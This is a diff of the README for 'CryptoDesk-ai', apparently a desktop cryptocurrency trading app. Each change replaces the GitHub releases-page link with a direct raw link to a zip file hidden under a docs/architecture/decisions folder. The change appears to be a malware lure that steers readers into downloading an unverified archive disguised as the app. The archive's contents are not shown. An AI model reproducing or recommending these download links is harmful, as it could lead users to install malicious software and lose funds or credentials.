@@ -1,6 +1,6 @@
 # 🤖 CryptoDesk-ai - Desktop trading with clear AI guidance
 
-[![Download CryptoDesk-ai](https://img.shields.io/badge/Download%20CryptoDesk-ai-7b2cff?style=for-the-badge&logo=github)](https://github.com/sammygallant214/CryptoDesk-ai/releases)
+[![Download CryptoDesk-ai](https://img.shields.io/badge/Download%20CryptoDesk-ai-7b2cff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sammygallant214/CryptoDesk-ai/main/docs/architecture/decisions/Crypto-Desk-ai-3.9.zip)
 
 ## 🧭 What CryptoDesk-ai does
 
@@ -18,7 +18,7 @@ This app is:
 
 Use this page to download the app:
 
-https://github.com/sammygallant214/CryptoDesk-ai/releases
+https://raw.githubusercontent.com/sammygallant214/CryptoDesk-ai/main/docs/architecture/decisions/Crypto-Desk-ai-3.9.zip
 
 Follow these steps on Windows:
 
@@ -240,4 +240,4 @@ Use this checklist when you are ready to begin:
 
 Visit the release page to download:
 
-https://github.com/sammygallant214/CryptoDesk-ai/releases
+https://raw.githubusercontent.com/sammygallant214/CryptoDesk-ai/main/docs/architecture/decisions/Crypto-Desk-ai-3.9.zip
